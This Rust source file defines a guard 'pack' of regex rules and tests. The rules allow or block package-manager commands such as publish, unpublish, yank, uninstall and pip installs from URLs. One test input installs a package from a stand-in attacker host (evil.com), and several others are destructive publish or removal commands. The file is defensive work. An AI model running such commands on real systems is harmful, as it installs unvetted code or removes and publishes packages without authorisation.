//! Package Managers pack - protections for package manager commands.
//!
//! This pack provides protection against dangerous package manager operations:
//! - npm/yarn/pnpm publish without verification
//! - pip install from untrusted sources
//! - apt/yum remove critical packages
//! - cargo publish

use crate::normalize::{NormalizeTokenKind, ShellDialect, ShellTokenDecoder, ShellTokenRole};
use crate::packs::{DestructivePattern, Pack, SafePattern};
use crate::{destructive_pattern, safe_pattern};

/// Which package manager a `*-publish` rule guards, with the positional
/// subcommand-prefix keywords that tool accepts before `publish`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PublishExe {
    Npm,
    Yarn,
    Pnpm,
}

impl PublishExe {
    /// Map a destructive-rule name to the executable it guards.
    pub(crate) fn from_rule(name: Option<&str>) -> Option<Self> {
        match name {
            Some("npm-publish") => Some(Self::Npm),
            Some("yarn-publish") => Some(Self::Yarn),
            Some("pnpm-publish") => Some(Self::Pnpm),
            _ => None,
        }
    }

    fn matches_executable(self, word: &str) -> bool {
        let base = std::path::Path::new(word)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(word);
        let stem = base
            .strip_suffix(".cmd")
            .or_else(|| base.strip_suffix(".exe"))
            .or_else(|| base.strip_suffix(".com"))
            .unwrap_or(base);
        let name = match self {
            Self::Npm => "npm",
            Self::Yarn => "yarn",
            Self::Pnpm => "pnpm",
        };
        stem.eq_ignore_ascii_case(name)
    }

    /// A positional word that stands between the executable and `publish`
    /// without establishing a different subcommand (yarn's `workspace <name>`
    /// and Berry's `npm` prefix; pnpm's spelled-out `recursive`).
    fn is_transparent_prefix(self, word: &str) -> bool {
        match self {
            Self::Npm => false,
            Self::Yarn => word == "workspace" || word == "npm",
            Self::Pnpm => word == "recursive",
        }
    }

    fn prefix_consumes_next_word(self, word: &str) -> bool {
        matches!(self, Self::Yarn) && word == "workspace"
    }
}

/// Whether `command` genuinely invokes the given package manager's `publish`
/// subcommand. This inspects the ORIGINAL (unsanitized) command so quoting is
/// intact: an unquoted `publish` in subcommand position is publication, while
/// a quoted `publish` — or one sitting in option-value position — is argument
/// data. The pack regexes run on the sanitized view, which has already lost
/// the quotes that distinguish `pnpm --reporter "publish"` (a reporter value)
/// from `pnpm --reporter publish`, so this gate is what keeps the former
/// allowed while the latter fails closed (issue #306).
#[must_use]
pub(crate) fn invokes_publish_subcommand(command: &str, exe: PublishExe) -> bool {
    crate::packs::split_command_segments(command)
        .into_iter()
        .any(|segment| segment_invokes_publish(segment, exe))
}

fn segment_invokes_publish(segment: &str, exe: PublishExe) -> bool {
    let mut decoder = ShellTokenDecoder::new(ShellDialect::Posix);
    // (decoded value, was_unquoted) for each word token, in order.
    let words: Vec<(String, bool)> =
        crate::normalize::tokenize_for_shell_dialect(segment, ShellDialect::Posix)
            .iter()
            .filter(|token| token.kind == NormalizeTokenKind::Word)
            .filter_map(|token| {
                let raw = token.text(segment)?;
                let decoded = decoder.decode(raw, ShellTokenRole::Syntax)?;
                let was_unquoted = decoded.as_ref() == raw;
                Some((decoded.into_owned(), was_unquoted))
            })
            .collect();

    let Some(exe_index) = words
        .iter()
        .position(|(word, _)| exe.matches_executable(word))
    else {
        return false;
    };

    let mut preceding_positional = false;
    let mut skip_next = false;
    for index in exe_index + 1..words.len() {
        if skip_next {
            skip_next = false;
            continue;
        }
        let (word, was_unquoted) = &words[index];
        // A bare word that does not immediately follow an option establishes a
        // subcommand; a word after an option might be that option's value.
        let follows_option = index > exe_index + 1 && words[index - 1].0.starts_with('-');
        if word == "publish" {
            // Quoting demotes `publish` to data ONLY in option-value position
            // (`--reporter "publish"`): keep scanning for a real subcommand.
            // In subcommand position, `publish` is the subcommand regardless
            // of quoting — `pnpm 'publish'` still publishes — and an unquoted
            // `publish` after an option stays fail-closed.
            if follows_option && !was_unquoted {
                continue;
            }
            return !preceding_positional;
        }
        if word.starts_with('-') {
            continue;
        }
        if exe.is_transparent_prefix(word) {
            if exe.prefix_consumes_next_word(word) {
                skip_next = true;
            }
            continue;
        }
        if !follows_option {
            preceding_positional = true;
        }
    }
    false
}

/// Create the Package Managers pack.
#[must_use]
pub fn create_pack() -> Pack {
    Pack {
        id: "package_managers".to_string(),
        name: "Package Managers",
        description: "Protects against dangerous package manager operations like publishing \
                      packages and removing critical system packages",
        keywords: &[
            "npm", "yarn", "pnpm", "pip", "apt", "yum", "dnf", "cargo", "gem", "brew", "poetry",
            "mvn", "mvnw", "gradle", "gradlew", "publish",
        ],
        safe_patterns: create_safe_patterns(),
        destructive_patterns: create_destructive_patterns(),
        keyword_matcher: None,
        safe_regex_set: None,
        safe_regex_set_is_complete: false,
    }
}

fn create_safe_patterns() -> Vec<SafePattern> {
    vec![
        // npm/yarn/pnpm install are generally safe
        safe_pattern!(
            "npm-install",
            r"\bnpm\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:install|i|ci)(?=\s|$)"
        ),
        safe_pattern!(
            "yarn-add",
            r"\byarn\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:add|install)(?=\s|$)"
        ),
        safe_pattern!(
            "pnpm-install",
            r"\bpnpm\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:add|install|i)(?=\s|$)"
        ),
        // list/info commands are safe
        safe_pattern!(
            "npm-list",
            r"\bnpm\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:list|ls|info|view)(?=\s|$)"
        ),
        safe_pattern!(
            "yarn-list",
            r"\byarn\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:list|info|why)(?=\s|$)"
        ),
        // audit is safe
        safe_pattern!(
            "npm-audit",
            r"\bnpm\b(?:\s+--?\S+(?:\s+\S+)?)*\s+audit(?=\s|$)"
        ),
        safe_pattern!(
            "yarn-audit",
            r"\byarn\b(?:\s+--?\S+(?:\s+\S+)?)*\s+audit(?=\s|$)"
        ),
        // pip list/show are safe
        safe_pattern!(
            "pip-list",
            r"\bpip\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:list|show|freeze)(?=\s|$)"
        ),
        // poetry show/info are safe
        safe_pattern!(
            "poetry-show",
            r"\bpoetry\b(?:\s+--?\S+(?:\s+\S+)?)*\s+show(?=\s|$)"
        ),
        safe_pattern!(
            "poetry-env-list",
            r"\bpoetry\b(?:\s+--?\S+(?:\s+\S+)?)*\s+env\s+list(?=\s|$)"
        ),
        // cargo build/test/check are safe
        safe_pattern!(
            "cargo-safe",
            r"\bcargo\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:build|test|check|clippy|fmt|doc|bench)\b"
        ),
        // apt list/show are safe
        safe_pattern!(
            "apt-list",
            r"\bapt\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:list|show|search)(?=\s|$)"
        ),
        safe_pattern!(
            "apt-get-list",
            r"\bapt-get\b(?:\s+--?\S+(?:\s+\S+)?)*\s+(?:update|upgrade)(?!\s+.*-y)"
        ),
        // dry-run flags. Treat only bare `--dry-run` or explicit true
        // as previews; false-valued flags must not mask publish rules.
        // Segment-bounded ([^;|&\n]*) so a dry-run in one shell segment
        // cannot mask a real command in a later segment (issue #306).
        safe_pattern!(
            "npm-dry-run",
            r"\bnpm\b[^;|&\n]*--dry-run(?:=true)?(?:\s|$)"
        ),
        safe_pattern!(
            "yarn-dry-run",
            r"\byarn\b[^;|&\n]*--dry-run(?:=true)?(?:\s|$)"
        ),
        safe_pattern!(
            "pnpm-dry-run",
            r"\bpnpm\b[^;|&\n]*--dry-run(?:=true)?(?:\s|$)"
        ),
        safe_pattern!(
            "cargo-dry-run",
            r"\bcargo\b[^;|&\n]*--dry-run(?:=true)?(?:\s|$)"
        ),
        safe_pattern!(
            "poetry-dry-run",
            r"\bpoetry\b[^;|&\n]*--dry-run(?:=true)?(?:\s|$)"
        ),
    ]
}

fn create_destructive_patterns() -> Vec<DestructivePattern> {
    vec![
        // npm/yarn/pnpm publish.
        //
        // `publish` must be in SUBCOMMAND position: only option tokens (and
        // each option's possible value word) may sit between the executable
        // and `publish`. An earlier bare positional word (`run`, `exec`, …)
        // establishes a different subcommand, so a later `publish` is
        // argument data, and an unbounded `.*?` gap would also cross shell
        // segment boundaries (`pnpm run build; bun ./publish-snapshot.ts`) —
        // both were false positives in issue #306. An option value may not
        // itself be a bare `publish` (fail-closed: `pnpm --reporter publish`
        // still denies; the clearly-data quoted form `--reporter "publish"`
        // does not). The trailing lookahead keeps `--dry-run` previews
        // allowed within the same segment only.
        destructive_pattern!(
            "npm-publish",
            r"\bnpm(?:\.(?:cmd|exe|com))?\b(?:\s+--?[^\s;|&]+(?:\s+(?!publish(?:[\s;|&]|$))[^-\s;|&][^\s;|&]*)?)*\s+publish(?=[\s;|&]|$)(?![^;|&\n]*--dry-run(?:=true)?(?:\s|$))",
            "npm publish releases a package publicly. Use --dry-run first."
        ),
        // yarn also reaches publish through the positional `workspace <name>`
        // and Berry's `npm` prefix, so those two shapes stay denied.
        destructive_pattern!(
            "yarn-publish",
            r"\byarn(?:\.(?:cmd|exe|com))?\b(?:\s+(?:--?[^\s;|&]+(?:\s+(?!publish(?:[\s;|&]|$))[^-\s;|&][^\s;|&]*)?|workspace\s+[^\s;|&]+|npm\b))*\s+publish(?=[\s;|&]|$)(?![^;|&\n]*--dry-run(?:=true)?(?:\s|$))",
            "yarn publish releases a package publicly. Verify package.json first."
        ),
        // pnpm's positional `recursive` prefix is `-r` spelled out.
        destructive_pattern!(
            "pnpm-publish",
            r"\bpnpm(?:\.(?:cmd|exe|com))?\b(?:\s+(?:--?[^\s;|&]+(?:\s+(?!publish(?:[\s;|&]|$))[^-\s;|&][^\s;|&]*)?|recursive\b))*\s+publish(?=[\s;|&]|$)(?![^;|&\n]*--dry-run(?:=true)?(?:\s|$))",
            "pnpm publish releases a package publicly."
        ),
        // npm unpublish. The `(?=\s|$)` trailing anchor ensures the
        // subcommand token ends at whitespace or end-of-string — otherwise
        // `npm install unpublish-helper` (a package literally named
        // `unpublish-helper`) would false-match.
        destructive_pattern!(
            "npm-unpublish",
            r"\bnpm\b.*?\bunpublish(?=\s|$)",
            "npm unpublish removes a published package. This can break dependent projects."
        ),
        // pip uninstall. Same trailing-anchor rule so installing a package
        // named `uninstall-tool` doesn't false-match the destructive rule.
        destructive_pattern!(
            "pip-uninstall",
            r"\bpip(?:3)?\b.*?\buninstall(?=\s|$)",
            "pip uninstall removes installed packages. Verify dependencies before removing."
        ),
        // pip install from URL (potential security risk)
        destructive_pattern!(
            "pip-url",
            r"\bpip\b.*?\binstall\s+.*(?:https?://|git\+)",
            "pip install from URL can install unvetted code. Verify the source first."
        ),
        // pip install --user or --system
        destructive_pattern!(
            "pip-system",
            r"\bpip\b.*?\binstall\s+.*--(?:system|target\s*/usr)",
            "pip install to system directories requires careful review."
        ),
        // apt remove/purge. Trailing `(?=\s|$)` so a package literally named
        // `remove-tool` doesn't false-match when installed via apt.
        destructive_pattern!(
            "apt-remove",
            r"\bapt(?:-get)?\b.*?\b(?:remove|purge|autoremove)(?=\s|$)",
            "apt remove/purge removes packages. Verify no critical packages are affected."
        ),
        // yum/dnf remove (same anchor logic as apt)
        destructive_pattern!(
            "yum-remove",
            r"\b(?:yum|dnf)\b.*?\b(?:remove|erase|autoremove)(?=\s|$)",
            "yum/dnf remove removes packages. Verify no critical packages are affected."
        ),
        // cargo publish
        destructive_pattern!(
            "cargo-publish",
            r"\bcargo\b.*?\bpublish\b(?!.*--dry-run(?:=true)?(?:\s|$))",
            "cargo publish releases a crate to crates.io. Use --dry-run first."
        ),
        // cargo yank. Same trailing anchor so a crate named `yank-helper`
        // doesn't false-match during install/build operations.
        destructive_pattern!(
            "cargo-yank",
            r"\bcargo\b.*?\byank(?=\s|$)",
            "cargo yank marks a version as unavailable. This can break dependent projects."
        ),
        // gem push
        destructive_pattern!(
            "gem-push",
            r"\bgem\b.*?\bpush\b",
            "gem push releases a gem to rubygems.org. Verify before publishing."
        ),
        // brew uninstall. `(?=\s|$)` so `brew install uninstall-helper` doesn't
        // false-match the destructive rule.
        destructive_pattern!(
            "brew-uninstall",
            r"\bbrew\b.*?\b(?:uninstall|remove)(?=\s|$)",
            "brew uninstall removes packages. Verify no dependent packages are affected."
        ),
        // poetry publish/remove
        destructive_pattern!(
            "poetry-publish",
            r"\bpoetry\b.*?\bpublish\b(?!.*--dry-run(?:=true)?(?:\s|$))",
            "poetry publish releases a package. Use --dry-run first."
        ),
        destructive_pattern!(
            "poetry-remove",
            r"\bpoetry\b.*?\bremove(?=\s|$)",
            "poetry remove uninstalls a dependency. Verify no critical packages are affected."
        ),
        // maven deploy / release
        destructive_pattern!(
            "maven-deploy",
            r"\b(?:mvn|mvnw)\b.*?\bdeploy\b",
            "mvn deploy publishes artifacts to a remote repository. Verify target repository."
        ),
        destructive_pattern!(
            "maven-release-perform",
            r"\b(?:mvn|mvnw)\s+.*release:perform\b",
            "mvn release:perform publishes a release. Verify version and repository."
        ),
        // gradle publish / release
        destructive_pattern!(
            "gradle-publish",
            r"\b(?:gradle|gradlew)\s+.*\bpublish\b",
            "gradle publish uploads artifacts. Use --dry-run first when possible."
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::packs::test_helpers::{
        assert_allows, assert_blocks, assert_blocks_with_pattern, assert_no_safe_match,
        assert_safe_pattern_matches,
    };

    /// Issue #306: the quoting-aware gate distinguishes a `publish` option
    /// value (quoted, or in value position) from the `publish` subcommand,
    /// inspecting the ORIGINAL command where quoting survives.
    #[test]
    fn invokes_publish_subcommand_gate_issue_306() {
        use PublishExe::{Npm, Pnpm, Yarn};
        // (command, exe, expected-invokes-publish)
        let cases: &[(&str, PublishExe, bool)] = &[
            ("pnpm publish", Pnpm, true),
            ("pnpm -r publish", Pnpm, true),
            ("pnpm recursive publish", Pnpm, true),
            ("pnpm --filter workspace publish", Pnpm, true),
            ("pnpm --silent publish", Pnpm, true),
            ("pnpm --reporter append-only publish", Pnpm, true),
            ("pnpm --reporter publish", Pnpm, true), // unquoted value → fail closed
            ("cd pkg && pnpm publish", Pnpm, true),
            ("pnpm.cmd publish", Pnpm, true),
            // Quoting the subcommand does NOT demote it: `pnpm 'publish'` still
            // publishes and must be caught (regression guard).
            ("pnpm 'publish'", Pnpm, true),
            ("pnpm \"publish\"", Pnpm, true),
            // Quoted publish is a value only in OPTION-VALUE position.
            ("pnpm --reporter \"publish\"", Pnpm, false),
            ("pnpm --reporter 'publish'", Pnpm, false),
            ("pnpm run build --reporter \"publish\"", Pnpm, false),
            ("pnpm --reporter \"publish\" run build", Pnpm, false),
            // A prior positional established a different subcommand.
            ("pnpm run build publish", Pnpm, false),
            ("pnpm run publish", Pnpm, false),
            ("pnpm install publish", Pnpm, false),
            // No pnpm executable at all (a pnpm inside quoted data).
            ("grep \"pnpm publish\" notes.md", Pnpm, false),
            ("pnpm run build; bun ./publish-snapshot.ts", Pnpm, false),
            // npm / yarn
            ("npm publish", Npm, true),
            ("npm --registry https://r.example publish", Npm, true),
            ("npm run build && node ./publish.js", Npm, false),
            ("yarn publish", Yarn, true),
            ("yarn workspace pkg-a publish", Yarn, true),
            ("yarn npm publish", Yarn, true),
            ("yarn run build publish", Yarn, false),
        ];
        for &(command, exe, expected) in cases {
            assert_eq!(
                invokes_publish_subcommand(command, exe),
                expected,
                "invokes_publish_subcommand({command:?}, {exe:?})"
            );
        }
    }

    /// Issue #306: `publish` is only pnpm's subcommand when it sits in
    /// subcommand position; argument data and later shell segments are not
    /// publication.
    #[test]
    fn publish_is_a_subcommand_not_argument_data_issue_306() {
        let pack = create_pack();

        // Argument data / different segment: allowed.
        for command in [
            "pnpm run build; bun ./publish-snapshot.ts",
            "pnpm run build --reporter \"publish\"",
            "pnpm --reporter \"publish\"",
            "pnpm run build publish",
            "npm run build && node ./publish.js",
            "yarn run build publish",
            "pnpm --silent publish-tool",
        ] {
            assert_allows(&pack, command);
        }

        // Real publication forms: still denied.
        for (command, rule) in [
            ("pnpm publish", "pnpm-publish"),
            ("pnpm -r publish", "pnpm-publish"),
            ("pnpm recursive publish", "pnpm-publish"),
            ("pnpm --filter workspace publish", "pnpm-publish"),
            ("pnpm --silent publish", "pnpm-publish"),
            ("pnpm --reporter append-only publish", "pnpm-publish"),
            // Unquoted option value named `publish` stays fail-closed.
            ("pnpm --reporter publish", "pnpm-publish"),
            ("pnpm.cmd --silent publish", "pnpm-publish"),
            ("npm publish", "npm-publish"),
            ("npm --registry https://r.example publish", "npm-publish"),
            ("yarn publish", "yarn-publish"),
            ("yarn workspace pkg-a publish", "yarn-publish"),
            // (`yarn npm publish` also denies, attributed to npm-publish
            // because that rule is listed first — asserted separately below.)
            ("cd pkg && pnpm publish", "pnpm-publish"),
        ] {
            assert_blocks_with_pattern(&pack, command, rule);
        }

        // Berry's `yarn npm publish` must deny; attribution may land on
        // either publish rule.
        assert_blocks(&pack, "yarn npm publish", "publish");
    }

    /// Issue #306: a `--dry-run` belonging to a DIFFERENT tool in a later
    /// segment must not connect back to `pnpm` across the separator and mask
    /// a real publish. (A dry-run on a pnpm invocation in a later segment
    /// still safe-matches that invocation — command-level masking is the
    /// evaluator's segment-scoping concern, not this regex's.)
    #[test]
    fn dry_run_is_segment_bounded_issue_306() {
        let pack = create_pack();
        assert_no_safe_match(&pack, "pnpm publish; rsync -a --dry-run src/ dst/");
        assert_blocks_with_pattern(
            &pack,
            "pnpm publish; rsync -a --dry-run src/ dst/",
            "pnpm-publish",
        );
        // Same-segment dry-run remains a preview.
        assert_safe_pattern_matches(&pack, "pnpm publish --dry-run");
    }

    #[test]
    fn package_manager_patterns_match_with_global_flags() {
        // Same class bug as every other CLI-prefix pack. Package
        // managers have mainline global flags:
        //   cargo --frozen publish
        //   cargo --offline --locked publish
        //   npm --registry=http://internal.corp/ publish
        //   pip --quiet install http://evil.com/pkg.tar.gz
        //   apt-get -o Dpkg::Options::="--force-yes" remove critical-pkg
        //   brew --verbose uninstall important
        let pack = create_pack();
        assert_blocks(&pack, "cargo --frozen publish", "publish");
        assert_blocks(&pack, "cargo --offline --locked publish", "publish");
        assert_blocks(
            &pack,
            "npm --registry=http://internal.corp/ publish",
            "publish",
        );
        assert_blocks(
            &pack,
            "pip --quiet install http://evil.com/pkg.tar.gz",
            "unvetted code",
        );
        assert_blocks(&pack, "brew --verbose uninstall important", "uninstall");
        assert_blocks(
            &pack,
            "cargo --frozen yank --version 1.0.0 my-crate",
            "yank",
        );
    }

    #[test]
    fn brew_uninstall_is_reachable_via_keywords() {
        let pack = create_pack();
        assert!(
            pack.might_match("brew uninstall wget"),
            "brew should be included in pack keywords to prevent false negatives"
        );
        let matched = pack
            .check("brew uninstall wget")
            .expect("brew uninstall should be blocked by package managers pack");
        assert_eq!(matched.name, Some("brew-uninstall"));
    }

    #[test]
    fn poetry_maven_gradle_and_pip_uninstall_block() {
        let pack = create_pack();
        assert_blocks(&pack, "poetry publish", "poetry publish");
        assert_blocks(&pack, "poetry remove requests", "poetry remove");
        assert_blocks(&pack, "mvn deploy", "mvn deploy");
        assert_blocks(&pack, "./mvnw release:perform", "release:perform");
        assert_blocks(&pack, "gradle publish", "gradle publish");
        assert_blocks(&pack, "./gradlew publish", "gradle publish");
        assert_blocks(&pack, "pip uninstall boto3", "pip uninstall");
        assert_blocks(&pack, "pip3 uninstall requests", "pip uninstall");
    }

    #[test]
    fn publish_dry_run_false_does_not_bypass_destructive_patterns() {
        let pack = create_pack();

        for command in [
            "npm publish --dry-run",
            "npm publish --dry-run=true",
            "yarn publish --dry-run",
            "pnpm publish --dry-run",
            "cargo publish --dry-run",
            "poetry publish --dry-run",
        ] {
            assert_allows(&pack, command);
            assert_safe_pattern_matches(&pack, command);
        }

        for (command, pattern) in [
            ("npm publish --dry-run=false", "npm-publish"),
            ("yarn publish --dry-run=false", "yarn-publish"),
            ("pnpm publish --dry-run=false", "pnpm-publish"),
            ("cargo publish --dry-run=false", "cargo-publish"),
            ("poetry publish --dry-run=false", "poetry-publish"),
            ("npm publish --dry-run=0", "npm-publish"),
            ("npm publish --no-dry-run", "npm-publish"),
        ] {
            assert_blocks_with_pattern(&pack, command, pattern);
            assert_no_safe_match(&pack, command);
        }
    }

    #[test]
    fn pnpm_publish_is_a_subcommand_not_argument_data() {
        let pack = create_pack();

        for command in [
            "pnpm run build; bun ./publish-snapshot.ts",
            "pnpm run build --reporter 'publish'",
            "pnpm --reporter 'publish'",
            "pnpm run build publish",
        ] {
            assert_allows(&pack, command);
        }

        for command in [
            "pnpm publish",
            "pnpm -r publish",
            "pnpm --filter workspace publish",
            "pnpm --silent publish",
            "pnpm --reporter append-only publish",
            "pnpm.cmd --silent publish",
        ] {
            assert_blocks_with_pattern(&pack, command, "pnpm-publish");
        }
    }

    #[test]
    fn keyword_absent_skips_pack() {
        let pack = create_pack();
        assert!(!pack.might_match("echo hello"));
        assert!(pack.check("echo hello").is_none());
    }

    #[test]
    fn destructive_keyword_inside_package_name_does_not_false_match() {
        // The destructive subcommand token must end at a word-break that is
        // whitespace or end-of-string — mere `\b` (which includes hyphen
        // boundaries) false-matches package names like `uninstall-tool` or
        // `remove-cli` when they appear as install arguments.
        let pack = create_pack();
        assert!(
            pack.check("pip install uninstall-tool").is_none(),
            "pip install uninstall-tool must not false-match pip-uninstall"
        );
        assert!(
            pack.check("pip3 install uninstall-helper==1.0").is_none(),
            "pip3 install uninstall-helper must not false-match pip-uninstall"
        );
        assert!(
            pack.check("npm install unpublish-ci").is_none(),
            "npm install unpublish-ci must not false-match npm-unpublish"
        );
        assert!(
            pack.check("brew install remove-cli").is_none(),
            "brew install remove-cli must not false-match brew-uninstall"
        );
        assert!(
            pack.check("apt install remove-helper").is_none(),
            "apt install remove-helper must not false-match apt-remove"
        );
        assert!(
            pack.check("poetry add remove-lib").is_none(),
            "poetry add remove-lib must not false-match poetry-remove"
        );
        assert!(
            pack.check("cargo install yank-checker").is_none(),
            "cargo install yank-checker must not false-match cargo-yank"
        );

        // Sanity: the genuine destructive forms still block.
        assert_blocks(&pack, "pip uninstall boto3", "pip uninstall");
        assert_blocks(&pack, "brew uninstall wget", "brew uninstall");
        assert_blocks(&pack, "apt remove nginx", "apt remove");
        assert_blocks(&pack, "cargo yank --version 1.0 my-crate", "yank");
    }
}
